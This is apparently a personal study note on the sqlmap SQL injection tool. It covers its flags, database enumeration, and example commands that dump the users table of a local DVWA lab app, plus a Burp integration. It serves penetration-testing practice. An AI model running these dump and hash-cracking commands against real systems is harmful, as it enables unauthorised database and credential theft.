[Sqlmap]: https://github.com/sqlmapproject/sqlmap
[Sqlmap Introduction]: https://github.com/sqlmapproject/sqlmap/wiki/Introduction
[Usage]: https://github.com/sqlmapproject/sqlmap/wiki/Usage

### Table of Contents
1. What SQLMAP Will Do 
2. Usage
3. Example DVWA
4. SQLMAP + Burp

`pip3 install sqlmap`

------------------------------------------------------------
------------------------------------------------------------

### What SQLMAP Will Do
1. Identify the parameters to test
  + In this case `id`
2. Identify _SQL Injection_ **techniques** to use
3. Fingerprint the _back-end DBMS_ (go gather info)
4. Attempt to _exploit vulnerabilities_

------------------------------------------------------------
------------------------------------------------------------

### Usage
+ `--wizard` flag will **help for beginners**
+ `-h` help output
+ `--batch` use _default behavior_

+ `-u URL` the URL
+ `--cookie=COOKIE` HTTP Cookie header value
 - Use _Firefox Developer Tools_
  * Click on _Network_ Tab on top of dev tools
  * Click on _Cookies_ or right hand side
 - Can also use `BURP`
+ `-p TESTPARAMETER` testable parameter(s)
+ `-r REQUESTFILE`   Load HTTP request from a file

**ENUMERATION**
_What to do_ and _what to return_ if there **is a SQLi exploit**

+ `--tables` enumerate DBMS database tables
+ `-T TBL`   DBMS database table(s) to enumerate
+ `--columns` enumerates DMBS database columns
+ `-C COL`   DBMS database column(s) to enumerate
+ `--current-user` retrieve DBMS current user
+ `--dump` Dump DBMS database table entries

------------------------------------------------------------
------------------------------------------------------------

### Example DVWA
URL: `127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#`

```SQLMap_Cmd
sqlmap -u "127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#"
--cookie="PHPSESSID=<id>; security=low" --tables
```

```SQLMap_Dump_Users_Table
sqlmap -u "127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#"
--cookie="PHPSESSID=<id>; security=low" --columns -T users
```

```SQLMap_Dump_Users_Table
sqlmap -u "127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#"
--cookie="PHPSESSID=<id>; security=low" --dump -T users
```
+ Will ask if i want to store hases to a temp file
+ Will ask if i want to crack them via dictionary-based attack

------------------------------------------------------------
------------------------------------------------------------

### SQLMAP + Burp

**Burp -> Sqlmap**
[Tutorial]: https://www.youtube.com/watch?v=_j5gOeUArYI
+ Use the `-r` flag in `sqlmap`
+ Use the `-p` flag in `sqlmap`

```Example_Command_Example
sqlmap -r request_file_from_burp -p parameter_name --dump
```

- - - - - - - - - - - - - - - -

**SQLMap -> Burp**
[Tutorial 1]: https://www.youtube.com/watch?v=auew7v2nTJc

Extension Name: `SQLiPy Sqlmap Integration`

+ Right Click a request
+ Click `SQLiPy Scan`
+ This should take you to the `SQLiPy` tab
 - there's a list or _radio buttons_ of what I want
  * Like the current user

------------------------------------------------------------
------------------------------------------------------------
